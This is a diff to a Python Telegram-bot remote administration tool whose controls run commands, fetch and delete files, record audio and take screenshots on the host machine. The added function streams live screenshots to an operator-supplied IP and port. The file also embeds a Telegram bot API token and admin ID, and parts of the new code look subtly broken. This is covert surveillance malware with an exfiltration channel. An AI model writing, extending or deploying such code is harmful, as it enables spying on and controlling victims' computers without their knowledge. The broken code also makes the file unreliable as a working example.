@@ -1,15 +1,16 @@
 import subprocess
 import pyautogui
-import telebot
+from telebot import TeleBot
 from telebot import types
 import pyaudio
 import wave
 import os
+import socket
 
 API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
 ADMIN = 804011643
 
-bot = telebot.TeleBot(API_TOKEN)
+bot = TeleBot(API_TOKEN)
 
 cd_btn = types.KeyboardButton("cd")
 cd_path_btn = types.KeyboardButton("cd_path")
@@ -24,6 +25,40 @@ screenshot_btn = types.KeyboardButton("screenshot")
 markup = types.ReplyKeyboardMarkup(True, True)
 markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
             exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn)
+
+def connect_to_server(ms):
+    if checkID(ms):
+        bot.send_message(ADMIN, "Enter...")
+        
+        @bot.message_handler(content_types=["text"])
+        def connect_to_server_next(ms):
+            try:
+                list_data = ms.text.split()
+                IP = list_data[0]
+                PORT = list_data[1]
+                
+                import numpy as np
+                import socket
+                import pickle
+                import struct
+                import pyautogui
+                from PIL import Image
+
+                clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                clientsocket.connect((IP, PORT))
+
+                while True:
+                    image = pyautogui.screenshot()
+                    image = image.resize((1100, 650))
+                    image = np.array(image)
+                    img = Image.frombytes('RGB', (1100, 650), image)
+                    data = pickle.dumps(np.array(img))
+                    clientsocket.sendall(struct.pack("L", len(data)) + data)
+            except Exception as e:
+                bot.send_message(ADMIN, f"Error:\n{e}")
+        
+        bot.register_next_step_handler(ms, connect_to_server_next)
+
 
 def create_markup(markup):
     list_files = os.listdir(os.getcwd())
